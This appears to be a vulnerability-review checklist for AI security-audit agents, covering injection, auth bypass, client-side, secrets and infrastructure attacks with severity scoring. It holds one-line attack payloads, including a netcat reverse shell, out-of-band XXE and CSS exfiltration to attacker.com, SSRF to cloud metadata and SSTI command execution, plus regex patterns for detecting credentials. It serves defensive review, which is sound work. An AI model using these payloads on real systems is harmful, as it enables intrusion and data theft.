# Attack Criteria

Attack checklist referenced by attack-review agents. Each agent reads its assigned section and investigates the corresponding attack vectors.
All checks are performed from an **attacker's perspective**. The question is not "Is this defense sufficient?" but rather "How do I break through?"

## Risk Matrix

All findings are assessed using Likelihood x Impact.
**Vocabulary standardization**: Likelihood / Impact / Risk Level all use the 4-value scale `critical | high | medium | low` (aligned with the JSON output schema).

| | Impact: Low | Impact: Medium | Impact: High | Impact: Critical |
|---|---|---|---|---|
| **Likelihood: Critical** | Medium | High | Critical | Critical |
| **Likelihood: High**     | Low    | Medium | High     | Critical |
| **Likelihood: Medium**   | Low    | Medium | High     | High |
| **Likelihood: Low**      | Low    | Low    | Medium   | High |

- **Likelihood**: Discoverability + exploitability of the attack (can it be automated with tools, does it require authentication, can it be inferred from public information)
  - `critical`: trivially exploitable, automated tools detect it, no authentication needed
  - `high`: exploitable with moderate effort, publicly known technique
  - `medium`: requires specific conditions or insider knowledge
  - `low`: theoretical, requires significant effort or unusual conditions
- **Impact**: Severity of damage (RCE, data breach, privilege escalation, service disruption, financial loss)
  - `critical`: full system compromise, mass data breach, RCE
  - `high`: significant data leak, privilege escalation, account takeover
  - `medium`: limited data exposure, service disruption, single-user impact
  - `low`: information disclosure with minimal sensitivity, minor inconvenience

---

## Agent 1: Injection Hunter — Injection Attack Specialist (server)

Traces paths where external input reaches internal commands, queries, or templates on the server side, and identifies injectable points.

### Check Items

#### 1-1. SQL Injection (SQLi)

- **WHAT**: Locations where user input is embedded into SQL statements via string concatenation
- **WHERE**: ORM `raw()` / `execute()` / `query()` calls, SQL template literals, stored procedure invocations
- **HOW TO EXPLOIT**: `' OR 1=1 --`, UNION-based extraction, blind SQLi (time-based / boolean-based), second-order SQLi (stored values injected into subsequent queries)
- **WHY DANGEROUS**: Extraction, modification, or deletion of all DB data; authentication bypass; in some cases OS command execution (`xp_cmdshell`, `LOAD_FILE`)
- **SEVERITY**:
  - Critical: Unparameterized dynamic SQL where user input directly reaches the query
  - High: ORM raw queries with partial escaping that can be bypassed
  - Medium: Indirect access via stored procedures
  - Low: Input has type constraints making injection difficult (integers only, etc.)

#### 1-2. Command Injection / OS Command Injection

- **WHAT**: Locations where user input is passed to shell commands
- **WHERE**: `child_process.exec()`, `os.system()`, `subprocess.Popen(shell=True)`, backtick execution, `Runtime.exec()`, `system()`, `popen()`
- **HOW TO EXPLOIT**: `; cat /etc/passwd`, `$(whoami)`, `| nc attacker.com 4444 -e /bin/sh`, newline injection, argument injection (`--output=/etc/cron.d/backdoor`)
- **WHY DANGEROUS**: Remote Code Execution (RCE). A direct path to full server compromise
- **SEVERITY**:
  - Critical: User input reaches `exec()` / `system()` with no sanitization
  - High: Input is partially filtered but can be bypassed via alternative characters (`\n`, `\x00`, Unicode normalization)
  - Medium: Argument injection (command itself is fixed but flags can be manipulated)
  - Low: Whitelist validation exists but may be incomplete

#### 1-3. Server-Side Request Forgery (SSRF)

- **WHAT**: Locations where the server fetches a URL / hostname specified by the user
- **WHERE**: HTTP client calls (`fetch`, `requests.get`, `HttpClient`), URL parameters, webhook URL settings, file import (URL-based)
- **HOW TO EXPLOIT**: `http://169.254.169.254/latest/meta-data/` (cloud metadata), `http://localhost:6379/` (internal services), `file:///etc/passwd`, DNS rebinding, URL parser differential bypass (`http://evil.com@localhost/`)
- **WHY DANGEROUS**: Theft of cloud credentials (IAM role credentials), scanning/attacking internal networks, file read access
- **SEVERITY**:
  - Critical: URL constructed directly from user input with no allowlist, in a cloud environment
  - High: URL validation exists but bypassable via DNS rebinding / URL parser differentials
  - Medium: Protocol restriction (http/https only) exists but internal IP addresses are reachable
  - Low: Allowlist exists but regex is incomplete

#### 1-4. Path Traversal / Local File Inclusion (LFI)

- **WHAT**: Locations where user input is used in file paths
- **WHERE**: `fs.readFile()`, `open()`, `include()`, upload destination paths, dynamic template file selection
- **HOW TO EXPLOIT**: `../../../etc/passwd`, `....//....//etc/passwd` (filter bypass), `%2e%2e%2f` (URL encoding), null byte injection (`%00`), Windows UNC paths (`\\attacker\share`)
- **WHY DANGEROUS**: Source code leakage, reading configuration files (`.env`, `config.json`), LFI → RCE (injection into log files + include)
- **SEVERITY**:
  - Critical: User input is used directly in file paths with no `../` filtering
  - High: Filter exists but checks before normalization (bypassable via double encoding)
  - Medium: Chroot / base path restriction exists but escapable via symlinks
  - Low: Whitelist-based approach but list management is incomplete

#### 1-5. Server-Side Template Injection (SSTI)

- **WHAT**: Locations where user input is passed to template engines
- **WHERE**: Jinja2 `render_template_string()`, Twig, Freemarker, Velocity, ERB, Pug/Jade dynamic template generation
- **HOW TO EXPLOIT**: `{{7*7}}` → `49` for detection, `{{config.items()}}` (Jinja2), `${Runtime.getRuntime().exec("id")}` (Freemarker), `#{system("id")}` (ERB)
- **WHY DANGEROUS**: RCE. Full server compromise via template engine sandbox escape
- **SEVERITY**:
  - Critical: Input is interpreted as a template, e.g., `render_template_string(user_input)`
  - High: User input reaches part of the template (variable names, filter names)
  - Medium: Sandbox mode is enabled but known escape techniques exist for the current version
  - Low: Template string is fixed; only data is user input

#### 1-6. XML External Entity (XXE)

- **WHAT**: Locations where the XML parser is configured to resolve external entities
- **WHERE**: XML parsers (`DocumentBuilder`, `SAXParser`, `lxml.etree`, `xml.etree`), SOAP endpoints, SVG uploads, XLSX/DOCX processing
- **HOW TO EXPLOIT**: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`, OOB-XXE (`<!ENTITY xxe SYSTEM "http://attacker.com/?data=...">`), Billion Laughs DoS
- **WHY DANGEROUS**: File read access, SSRF, DoS
- **SEVERITY**:
  - Critical: XML parser with external entities enabled processes user-supplied XML
  - High: DTD processing is enabled (attacks possible via parameter entities)
  - Medium: Parser is restricted but XML arrives via SVG / Office files
  - Low: XML parser configuration is secure but not documented

#### 1-7. LDAP Injection

- **WHAT**: Locations where user input is embedded into LDAP queries via string concatenation
- **WHERE**: LDAP authentication, directory searches, Active Directory integration
- **HOW TO EXPLOIT**: `*)(uid=*))(|(uid=*` to enumerate all users, `*)(userPassword=*)` for attribute extraction
- **WHY DANGEROUS**: Authentication bypass, unauthorized directory information retrieval
- **SEVERITY**:
  - Critical: User input is directly concatenated into LDAP filters with no escaping
  - High: Partial escaping exists but special character handling is incomplete
  - Medium: LDAP library's parameterized API is used but some queries are manually constructed
  - Low: Read-only LDAP bind limits the impact

#### 1-8. Header Injection / HTTP Response Splitting

- **WHAT**: Locations where user input is reflected in HTTP headers
- **WHERE**: `Location` header (redirects), `Set-Cookie`, custom headers, email `To` / `Subject` fields
- **HOW TO EXPLOIT**: Inject `\r\n` to add arbitrary headers, inject response body (HTTP Response Splitting), email header injection (`\nBcc: attacker@evil.com`)
- **WHY DANGEROUS**: XSS (via response body injection), cache poisoning, session fixation, spam email delivery
- **SEVERITY**:
  - Critical: `\r\n` reaches the header unfiltered
  - High: Some frameworks strip CRLF but older versions do so incompletely
  - Medium: Header values are encoded but issues arise under specific proxy configurations
  - Low: Modern frameworks auto-sanitize but custom header processing is unverified

### Language-Agnostic Patterns

An attacker would look for these universal anti-patterns regardless of language:

```
# String concatenation in queries (any language)
"SELECT * FROM users WHERE id = " + userInput
f"SELECT * FROM users WHERE id = {user_id}"
`SELECT * FROM users WHERE id = ${req.params.id}`

# Unsanitized shell execution
exec("convert " + filename)
os.system("ping " + host)
subprocess.run(f"nmap {target}", shell=True)

# URL from user input without allowlist
fetch(req.body.url)
requests.get(user_provided_url)
HttpClient.GetAsync(webhookUrl)

# File path from user input
open(f"uploads/{filename}")
fs.readFile(path.join(uploadDir, req.params.name))

# Template rendering with user input
render_template_string(user_input)
Template(user_input).render()
```

---

## Agent 2: AuthN/AuthZ Breaker — Authentication & Authorization Bypass Specialist (both)

Finds paths to bypass authentication, access other users' resources, and escalate privileges.

### Check Items

#### 2-1. Authentication Bypass

- **WHAT**: Paths that circumvent authentication checks
- **WHERE**: Authentication middleware / guards, login endpoints, password reset flows, API authentication, OAuth/OIDC implementations
- **HOW TO EXPLOIT**:
  - Missing authentication middleware on routes (new endpoint lacks `@login_required`)
  - HTTP method switching (`GET` requires auth but `POST` / `PUT` are unprotected)
  - Path normalization differences (`/admin` is protected but `/admin/` or `/Admin` or `/%61dmin` is not)
  - Residual default / test credentials (`admin:admin`, `test:test`)
  - Predictable password reset tokens (timestamp-based, short tokens)
  - Brute force without rate limiting
- **WHY DANGEROUS**: Unauthorized access to arbitrary accounts, admin privilege takeover
- **SEVERITY**:
  - Critical: Admin endpoints accessible without authentication
  - High: Predictable password reset tokens, login without rate limiting
  - Medium: Residual test credentials, absence of lockout mechanism
  - Low: Weak password policy (minimum length only)

#### 2-2. Insecure Direct Object Reference (IDOR)

- **WHAT**: Locations where ownership checks are missing during resource access
- **WHERE**: `/api/users/{id}`, `/api/orders/{orderId}`, `/api/documents/{docId}`, file download endpoints
- **HOW TO EXPLOIT**:
  - Increment IDs (`/api/users/1001` → `/api/users/1002`)
  - Even with UUIDs, collect other users' UUIDs from leak points in responses
  - GraphQL `node(id: "...")` queries to access arbitrary nodes
  - Inject other users' IDs in batch APIs (`[1001, 1002, 9999]`)
- **WHY DANGEROUS**: Viewing, modifying, or deleting other users' data
- **SEVERITY**:
  - Critical: Sequential IDs + no ownership check + sensitive data (PII, payment info)
  - High: UUIDs but no ownership check + sensitive data
  - Medium: Ownership check exists but is missing on specific API paths (listing / export)
  - Low: Only public data, but enumerable

#### 2-3. Privilege Escalation

- **WHAT**: Paths where low-privilege users can execute high-privilege operations
- **WHERE**: Role / permission check logic, admin APIs, user profile updates
- **HOW TO EXPLOIT**:
  - Send `role: "admin"` in request body (mass assignment)
  - Directly call admin APIs that are only hidden on the frontend
  - Authorization checks only on the frontend (backend does not validate)
  - Tamper with the `role` claim in tokens on the client side
  - Access resources of another tenant via path manipulation
- **WHY DANGEROUS**: Admin privilege takeover, cross-tenant data leakage
- **SEVERITY**:
  - Critical: Regular users can execute admin APIs (no backend validation)
  - High: Role check exists but is bypassable (e.g., logic error in conditional branching)
  - Medium: Horizontal privilege escalation (operating on resources of other users at the same level)
  - Low: Impact of privilege escalation is limited (view-only admin screens, etc.)

#### 2-4. JWT Weaknesses

- **WHAT**: Vulnerabilities in JWT generation and verification
- **WHERE**: JWT library usage, token generation / verification logic, middleware
- **HOW TO EXPLOIT**:
  - **Algorithm confusion**: `alg: "none"` to skip signature verification, `HS256` / `RS256` confusion (using the public key as the HMAC secret)
  - **Secret brute force**: Short / dictionary-attackable secrets (`secret`, `password123`)
  - **Missing expiry**: No `exp` claim → token is valid indefinitely
  - **Missing audience/issuer validation**: Reuse tokens from a different service
  - **Kid injection**: Inject SQLi / Path Traversal into the `kid` header
  - **JWK injection**: Specify the attacker's public key via `jwk` / `jku` headers
- **WHY DANGEROUS**: Impersonation of arbitrary users, persistent session hijacking
- **SEVERITY**:
  - Critical: Accepts `alg: "none"`, secret is guessable
  - High: No `exp`, audience not validated, `kid` injection possible
  - Medium: Excessively long token lifetime (24h+), no refresh token rotation
  - Low: JWT library version is outdated (potential known vulnerabilities)

#### 2-5. Session Management Flaws

- **WHAT**: Deficiencies in session management
- **WHERE**: Session generation, cookie settings, logout handling, password change handling
- **HOW TO EXPLOIT**:
  - **Session fixation**: Session ID does not change before and after login → attacker pre-sets the session ID
  - **Weak session ID generation**: Predictable RNG (`Math.random()`, timestamp-based)
  - **Missing invalidation**: Session remains valid server-side after logout, existing sessions continue after password change
  - **Concurrent sessions**: No limit on session count → difficult to detect stolen sessions
- **WHY DANGEROUS**: Session hijacking, persistent account takeover
- **SEVERITY**:
  - Critical: Session fixation + ID unchanged across login
  - High: Server-side session not destroyed on logout
  - Medium: Existing sessions not invalidated on password change
  - Low: Excessively long session timeout

#### 2-6. OAuth / OpenID Connect Misconfiguration

- **WHAT**: Implementation flaws in OAuth flows
- **WHERE**: OAuth authorization endpoints, callback URLs, token exchange
- **HOW TO EXPLOIT**:
  - **Open redirect via redirect_uri**: `redirect_uri=https://attacker.com` to steal access tokens
  - **Missing state parameter**: CSRF to link the attacker's OAuth account to the victim's account
  - **Authorization code replay**: Reuse of spent codes
  - **Scope escalation**: Request additional scopes to gain excessive permissions
  - **Public client without PKCE**: Authorization code interception
- **WHY DANGEROUS**: Account takeover, access token theft
- **SEVERITY**:
  - Critical: No `redirect_uri` validation (redirect to arbitrary domains possible)
  - High: No `state` parameter, SPA without PKCE
  - Medium: `redirect_uri` validated at subdomain level only (combinable with open redirect)
  - Low: Excessive scope grants (broader permissions than actually used)

#### 2-7. Cookie Security

- **WHAT**: Missing security attributes on cookies
- **WHERE**: `Set-Cookie` headers, session cookies, authentication token cookies
- **HOW TO EXPLOIT**:
  - No `HttpOnly` → session theft via `document.cookie` through XSS
  - No `Secure` → cookie sent in plaintext over HTTP (MITM theft)
  - `SameSite=None` + no `Secure` → vulnerable to CSRF
  - Overly broad cookie `Path` / `Domain` → theft via a vulnerable app on a subdomain
- **WHY DANGEROUS**: Session hijacking, CSRF
- **SEVERITY**:
  - Critical: Session cookie without `HttpOnly` + XSS exists
  - High: No `Secure` flag (HTTP enabled in production)
  - Medium: `SameSite` not set (relies on browser defaults)
  - Low: `Domain` attribute is overly broad

---

## Agent 3: Client Attack Specialist — Client-Side Attack Specialist (client)

Comprehensively investigates attack vectors operating in browser / client environments.

### Check Items

#### 3-1. Cross-Site Scripting (XSS)

- **WHAT**: Locations where user input is output into HTML / JavaScript contexts without sanitization
- **WHERE**: Template rendering, DOM insertion of API responses, error message display

##### 3-1a. Reflected XSS

- **HOW TO EXPLOIT**: URL parameters / form inputs reflected directly in HTML (`<script>alert(1)</script>`, `" onmouseover="alert(1)`, `javascript:alert(1)`)
- **SEVERITY**:
  - Critical: No WAF + no HttpOnly on cookies → complete session hijacking path
  - High: Output location is within HTML attributes / JavaScript contexts
  - Medium: CSP exists but allows `unsafe-inline`
  - Low: Self-XSS only (no delivery path to affect other users)

##### 3-1b. Stored XSS

- **HOW TO EXPLOIT**: Persistently store scripts in comments, profiles, filenames, etc. Fires for all users who view the content
- **SEVERITY**:
  - Critical: Fires on screens viewed by admins → admin privilege takeover
  - High: Propagates between regular users (comments, messages)
  - Medium: Fires only in limited contexts (specific screens only)
  - Low: Markdown renderer flaw but CSP blocks execution

##### 3-1c. DOM-based XSS

- **WHAT**: XSS that occurs when client-side JavaScript manipulates the DOM
- **SOURCES** (attacker-controllable inputs):
  - `location.hash`, `location.search`, `location.href`
  - `document.referrer`
  - `window.name`
  - `postMessage` data
  - `localStorage` / `sessionStorage` values
  - `document.cookie`
- **SINKS** (dangerous output destinations):
  - `innerHTML`, `outerHTML`, `insertAdjacentHTML`
  - `eval()`, `Function()`, `setTimeout(string)`, `setInterval(string)`
  - `document.write()`, `document.writeln()`
  - `element.src`, `element.href` (especially with `javascript:` protocol)
  - `jQuery.html()`, `$.append()`, `v-html`, `dangerouslySetInnerHTML`
- **HOW TO EXPLOIT**: Trace from source to sink. Misuse of `v-html`, `dangerouslySetInnerHTML` that bypass frameworks' safe bindings (`{{}}`, `{}`)
- **SEVERITY**:
  - Critical: Direct path like `eval(location.hash.slice(1))`
  - High: `innerHTML = data` where `data` is user-controllable
  - Medium: Intermediate processing includes sanitization but it is incomplete (passes `<img onerror=...>`, etc.)
  - Low: Source is limited (`window.name` only, etc.) with strict trigger conditions

#### 3-2. Cross-Site Request Forgery (CSRF)

- **WHAT**: Attack that forces authenticated users to perform unintended actions
- **WHERE**: All state-changing endpoints (POST / PUT / DELETE / PATCH)
- **HOW TO EXPLOIT**:
  - No CSRF token → auto-submit via `<form action="target.com/transfer" method="POST">`
  - No `SameSite` cookie + no CSRF token → cookies attached to cross-site requests
  - **State change via GET**: `<img src="target.com/api/delete?id=123">` executed via image tag
  - CSRF is possible even with JSON APIs: bypass preflight with `Content-Type: text/plain`
  - CSRF via Flash / PDF (legacy environments)
- **WHY DANGEROUS**: Password changes, fund transfers, account setting modifications executed under the victim's privileges
- **SEVERITY**:
  - Critical: No CSRF protection on fund transfer / password change / email change
  - High: No CSRF protection on admin operations (user deletion, permission changes)
  - Medium: No protection on moderate-impact operations (profile updates)
  - Low: No protection on low-impact operations (theme changes, etc.)

#### 3-3. DOM Clobbering

- **WHAT**: Attack that overwrites global variables via `id` / `name` attributes on HTML elements
- **WHERE**: Code that trusts `document.getElementById` results, named property fallback references
- **HOW TO EXPLOIT**: Injecting `<img id="isAdmin" src="x">` makes `window.isAdmin` truthy. `<form id="config"><input name="apiUrl" value="https://attacker.com"></form>` spoofs object properties
- **WHY DANGEROUS**: Bypass of security checks, tampering with configuration values
- **SEVERITY**:
  - Critical: Variables used in security decisions are clobberable
  - High: API endpoint URLs or configuration values are clobberable
  - Medium: Only affects UI display
  - Low: HTML injection context where clobbering is feasible is limited

#### 3-4. Prototype Pollution

- **WHAT**: Attack that pollutes `__proto__` / `constructor.prototype` of JavaScript objects
- **WHERE**: `Object.assign()`, lodash `merge` / `set` / `defaultsDeep`, merging JSON parser output directly, query parameter parsers
- **HOW TO EXPLOIT**: Send `{"__proto__": {"isAdmin": true}}`, send `?__proto__[isAdmin]=true` as query parameter
- **WHY DANGEROUS**: Inject properties into all objects → authentication bypass, XSS (exploitation via template engines), RCE (polluting `child_process` options)
- **SEVERITY**:
  - Critical: Prototype pollution → RCE (polluting `child_process.spawn` options)
  - High: Prototype pollution → authentication bypass / XSS
  - Medium: Pollution succeeds but no exploitable sink found
  - Low: Impact exists on server side but limited to client only

#### 3-5. Open Redirect

- **WHAT**: Vulnerability that redirects users to an attacker's site
- **WHERE**: Post-login redirects (`?next=`, `?redirect=`, `?return_url=`), OAuth `redirect_uri`
- **HOW TO EXPLOIT**: `https://target.com/login?next=https://attacker.com`, `//attacker.com`, `\/\/attacker.com`, `https://target.com@attacker.com`, `javascript:alert(1)`
- **WHY DANGEROUS**: Phishing (trusted because the transition originates from a legitimate domain), OAuth token theft
- **SEVERITY**:
  - Critical: Open redirect possible in the OAuth flow's `redirect_uri`
  - High: Arbitrary URL redirect from the login page
  - Medium: Redirect target restricted to subdomains but a vulnerable subdomain exists
  - Low: Redirect target uses allowlist but the list is overly broad

#### 3-6. Clickjacking

- **WHAT**: Attack that captures user clicks by overlaying the target site with a transparent iframe
- **WHERE**: Screens with state-changing buttons (delete, approve, transfer)
- **HOW TO EXPLOIT**: No `X-Frame-Options` / CSP `frame-ancestors` → loadable in iframe → place button over a transparent iframe
- **WHY DANGEROUS**: Unintended user actions (clicking delete confirmation, granting permissions, etc.)
- **SEVERITY**:
  - Critical: Screen with one-click dangerous actions (no two-step confirmation) is iframeable
  - High: Admin screens are iframeable
  - Medium: `X-Frame-Options` exists but allows broad domains via `ALLOW-FROM`
  - Low: Iframeable but only screens without state-changing actions

#### 3-7. postMessage Abuse

- **WHAT**: Insufficient origin validation for `window.postMessage`
- **WHERE**: `addEventListener("message", handler)` handlers
- **HOW TO EXPLOIT**:
  - No `event.origin` validation → send messages from attacker's iframe
  - Incomplete validation like `event.origin.indexOf("trusted.com")` → bypass with `attacker-trusted.com`
  - Received data passed to `innerHTML` or `eval` → DOM XSS
- **WHY DANGEROUS**: XSS-equivalent attack executed via inter-iframe communication
- **SEVERITY**:
  - Critical: No origin validation + received data reaches `eval` / `innerHTML`
  - High: Incomplete origin validation (substring match)
  - Medium: Origin validated but received data sanitization is insufficient
  - Low: Message reception is confirmed but no exploitable sink exists

#### 3-8. CSS Injection

- **WHAT**: Vulnerability where user input is injected into CSS contexts
- **WHERE**: Inline styles, `<style>` tags, CSS-in-JS templates
- **HOW TO EXPLOIT**: `background: url(https://attacker.com/steal?token=` + CSS attribute selectors to extract CSRF tokens character by character (`input[value^="a"] { background: url(attacker.com/?a) }`)
- **WHY DANGEROUS**: CSRF token theft, UI spoofing (phishing), data exfiltration
- **SEVERITY**:
  - Critical: CSS injection + CSRF token in attribute value → token extraction possible
  - High: Arbitrary CSS injectable (UI spoofing, keylogger-style input capture)
  - Medium: Only partial CSS is controllable
  - Low: Sanitization exists but bypass may be possible

---

## Agent 4: Data & Secrets Exfiltrator — Data & Sensitive Information Exfiltration Specialist (both)

Searches for paths to extract sensitive information from the system. Investigates hardcoded secrets in the codebase, information leakage through error messages, and excessive data exposure.

### Check Items

#### 4-1. Hardcoded Secrets

- **WHAT**: Secret information hardcoded in source code
- **WHERE**: Configuration files, test files, initialization code, comments, default values for environment variables
- **PATTERN MATCHING**:
  ```
  # AWS
  AKIA[0-9A-Z]{16}                          # AWS Access Key ID
  [0-9a-zA-Z/+]{40}                          # AWS Secret Access Key (near AKIA)

  # JWT / Bearer tokens
  eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+      # JWT token
  Bearer [A-Za-z0-9_\-\.]+                    # Bearer token

  # Private keys
  -----BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----

  # API keys (generic patterns)
  ['\"]?[Aa][Pp][Ii][-_]?[Kk][Ee][Yy]['\"]?\s*[:=]\s*['\"][A-Za-z0-9_\-]{16,}['\"]
  ['\"]?[Ss][Ee][Cc][Rr][Ee][Tt]['\"]?\s*[:=]\s*['\"][^\s'"]{8,}['\"]

  # Database URIs
  (postgres|mysql|mongodb|redis)://[^:]+:[^@]+@
  
  # Specific services
  sk-[A-Za-z0-9]{32,}                        # OpenAI API key
  ghp_[A-Za-z0-9]{36}                        # GitHub PAT
  xoxb-[0-9]+-[A-Za-z0-9]+                   # Slack Bot Token
  SG\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+        # SendGrid API key
  ```
- **WHY DANGEROUS**: An attacker gains full access to external services simply by accessing the repository
- **SEVERITY**:
  - Critical: Production API keys / database credentials hardcoded in source code
  - High: Test tokens that are also valid in production, committed private keys
  - Medium: Actual values remaining in `.env.example`, credentials in comments
  - Low: Dummy values but following the real format, creating confusion risk

#### 4-2. Error Message Information Leakage

- **WHAT**: Locations where internal information leaks through error messages or responses
- **WHERE**: Exception handlers, API error responses, log output, debug mode
- **HOW TO EXPLOIT**:
  - Identify framework, version, and internal path structure from stack traces
  - Extract table names, column names, and query structure from SQL error messages
  - Infer existing field names / types from validation errors
  - Confirm resource existence from 404 / 403 differences (user enumeration)
- **WHY DANGEROUS**: Dramatically shortens the reconnaissance phase of an attack. Understanding internal structure → precise targeting
- **SEVERITY**:
  - Critical: Full SQL queries, internal IP addresses, or credentials included in error messages
  - High: Full stack traces (framework + version + file paths) exposed externally
  - Medium: Framework default error pages (Django debug, Express stack trace) enabled in production
  - Low: Field validation messages that hint at the internal schema

#### 4-3. PII in Logs

- **WHAT**: Locations where personally identifiable information (PII) is recorded in logs
- **WHERE**: Access logs, application logs, audit logs, APM / traces
- **HOW TO EXPLOIT**: An attacker who gains access to the log collection system can extract PII in bulk. When log retention periods are long, all historical data is leaked
- **PATTERNS**:
  ```
  console.log(req.body)           # Entire request body (may contain passwords)
  logger.info(f"User: {user}")    # Entire User object (may contain email, phone)
  log.debug("Token: " + token)    # Authentication token logged
  ```
- **WHY DANGEROUS**: GDPR / data protection law violations, credential leakage via logs
- **SEVERITY**:
  - Critical: Passwords / authentication tokens logged
  - High: Sensitive PII (credit card numbers, SSN) logged
  - Medium: Email addresses, phone numbers logged
  - Low: IP addresses only (though considered PII under GDPR)

#### 4-4. Excessive Data in API Responses

- **WHAT**: Locations where API responses contain more data than necessary
- **WHERE**: User info APIs, listing APIs, GraphQL queries
- **HOW TO EXPLOIT**:
  - `/api/users/me` includes password hashes, internal IDs, admin flags
  - GraphQL introspection to retrieve full schema → discover hidden fields
  - Listing APIs without pagination allowing full data extraction
  - Field selection parameters like `?include=password_hash,secret_key`
- **WHY DANGEROUS**: Unnecessary data exposure → attack foothold, PII leakage
- **SEVERITY**:
  - Critical: Password hashes / internal secrets included in responses
  - High: Other users' PII obtainable via listing APIs
  - Medium: GraphQL introspection enabled in production
  - Low: Unnecessary internal fields (`created_by_ip`, etc.) included

#### 4-5. Exposed Files and Directories

- **WHAT**: Files or directories that should not be public are accessible
- **WHERE**: Web server public directories, static file serving configuration
- **HOW TO EXPLOIT**:
  - `/.git/HEAD` → full repository reconstruction (`git-dumper`)
  - `/.env` → direct retrieval of environment variables (DB credentials, etc.)
  - `/backup.sql`, `/dump.sql` → database dumps
  - `/.DS_Store` → directory structure inference
  - `/server-status`, `/debug`, `/phpinfo.php` → server information retrieval
  - `/swagger-ui/`, `/api-docs/` → API specification retrieval (without authentication)
  - `/*.map` → source code reconstruction from source maps
- **WHY DANGEROUS**: Full source code leakage, complete database dumps, direct credential retrieval
- **SEVERITY**:
  - Critical: `.git` directory or `.env` file is publicly accessible
  - High: Database dumps / backup files are publicly accessible
  - Medium: Source maps are publicly accessible, Swagger UI accessible without authentication
  - Low: Directory listing is enabled (no direct sensitive information leakage)

#### 4-6. Source Map Leaks

- **WHAT**: Source maps are publicly accessible in the production environment
- **WHERE**: JavaScript / CSS build output, `//# sourceMappingURL=` comments
- **HOW TO EXPLOIT**: Download `.js.map` files → fully reconstruct original source code (including TypeScript / JSX) → understand business logic, API endpoints, validation rules
- **WHY DANGEROUS**: Complete disassembly of the frontend → easy identification of attack targets
- **SEVERITY**:
  - Critical: Source maps contain server-side secrets (SSR builds)
  - High: Source maps reveal authentication logic / API key usage patterns
  - Medium: Business logic is fully reconstructable
  - Low: Source maps exist but contain limited useful information

---

## Agent 5: Infra & Supply Chain Exploiter — Infrastructure & Supply Chain Attack Specialist (both)

Searches for paths to compromise systems through configuration flaws, dependency vulnerabilities, and CI/CD pipeline weaknesses.

### Check Items

#### 5-1. CORS Misconfiguration

- **WHAT**: Cross-Origin Resource Sharing configuration flaws
- **WHERE**: `Access-Control-Allow-Origin` headers, CORS middleware configuration
- **HOW TO EXPLOIT**:
  - `Access-Control-Allow-Origin: *` + `Access-Control-Allow-Credentials: true` (browsers reject this but older versions may honor it)
  - Dynamic origin reflection: setting request's `Origin` directly as `Access-Control-Allow-Origin` → credentialed requests from any site
  - Regex flaws: `.*\.example\.com` → matches `attackerexample.com`
  - Allowing `null` origin → requests from `<iframe sandbox>` succeed
- **WHY DANGEROUS**: Retrieving authenticated users' data from an attacker's site
- **SEVERITY**:
  - Critical: Dynamic origin reflection + Credentials: true + sensitive API
  - High: `null` origin allowed + Credentials: true
  - Medium: Wildcard `*` exposing non-authenticated APIs (internal APIs unintentionally exposed)
  - Low: Broad CORS settings but Credentials is false

#### 5-2. Missing Security Headers

- **WHAT**: Missing security headers
- **WHERE**: HTTP response headers, web server / reverse proxy configuration

| Header | Missing Impact | Severity |
|--------|---------------|----------|
| `Content-Security-Policy` | Amplifies XSS impact. Effectively useless with `unsafe-inline` / `unsafe-eval` | High (Critical when XSS exists) |
| `Strict-Transport-Security` | Downgrade attacks (HTTPS → HTTP) for cookie theft | High |
| `X-Content-Type-Options: nosniff` | XSS via MIME sniffing (file uploads interpreted as HTML) | Medium |
| `X-Frame-Options` / CSP `frame-ancestors` | Clickjacking | Medium |
| `Permissions-Policy` | Access to unnecessary browser APIs (camera, microphone, geolocation) | Low |
| `Referrer-Policy` | URLs containing sensitive information (tokens, etc.) leaked via Referer | Medium |
| `Cross-Origin-Opener-Policy` | Spectre-class side-channel attacks | Low |
| `Cross-Origin-Resource-Policy` | Unintended cross-origin resource loading | Low |

- **SEVERITY**: Individual missing headers are Medium or below, but can escalate to Critical when combined with other vulnerabilities

#### 5-3. Dependency Vulnerabilities

- **WHAT**: Dependencies with known vulnerabilities
- **WHERE**: `package.json`, `package-lock.json`, `requirements.txt`, `Pipfile.lock`, `go.sum`, `Cargo.lock`, `pom.xml`, `Gemfile.lock`
- **HOW TO EXPLOIT**:
  - **Known CVEs**: Direct attack using publicly available exploit code
  - **Typosquatting**: Malicious packages with names similar to legitimate ones (`lodash` → `1odash`, `colors` → `co1ors`)
  - **Install scripts**: Arbitrary code execution via `postinstall` / `preinstall` scripts
  - **Dependency confusion**: Registering a package with the same name as an internal package on the public registry
- **WHY DANGEROUS**: Supply chain attacks are difficult to detect and have wide impact
- **SEVERITY**:
  - Critical: Package with known RCE CVE in use in production
  - High: CVE enabling authentication bypass / data leakage, suspicious install scripts
  - Medium: CVE enabling DoS, unmaintained packages
  - Low: Low-risk CVEs, very old packages without known direct vulnerabilities

#### 5-4. Default Credentials and Debug Endpoints

- **WHAT**: Residual default credentials and debug functionality
- **WHERE**: Admin panels, database connections, cache servers, message brokers
- **HOW TO EXPLOIT**:
  - Default credentials: `admin:admin`, `root:root`, `admin:password`, `postgres:postgres`
  - Debug endpoints: `/debug`, `/console`, `/graphiql`, `/__debug__/`, `/actuator/`, `/_profiler`
  - Environment variables: `DEBUG=true`, `NODE_ENV=development` active in production
  - Health checks: `/health` exposing internal state (DB connection strings, etc.)
- **WHY DANGEROUS**: Immediate admin access, complete exposure of internal information
- **SEVERITY**:
  - Critical: Admin access possible with default credentials
  - High: Debug console publicly accessible without authentication (Django debug toolbar, Spring Actuator)
  - Medium: Debug mode enabled exposing detailed error information
  - Low: Health checks contain minor internal information

#### 5-5. Insecure TLS Configuration

- **WHAT**: TLS / SSL configuration flaws
- **WHERE**: Web server configuration, API client certificate verification
- **HOW TO EXPLOIT**:
  - Old TLS versions (TLS 1.0 / 1.1) → BEAST, POODLE attacks
  - Weak cipher suites (RC4, DES, NULL cipher) → cryptanalysis
  - Certificate verification disabled (`verify=False`, `rejectUnauthorized: false`, `InsecureSkipVerify: true`) → MITM
  - No HTTP to HTTPS redirect → interception of first request
- **WHY DANGEROUS**: Traffic interception and modification (Man-in-the-Middle)
- **SEVERITY**:
  - Critical: Certificate verification disabled in production code
  - High: TLS 1.0 / 1.1 enabled, weak cipher suites in use
  - Medium: No HSTS, no HTTP → HTTPS redirect
  - Low: Not using only the latest cipher suites but practical attacks are infeasible

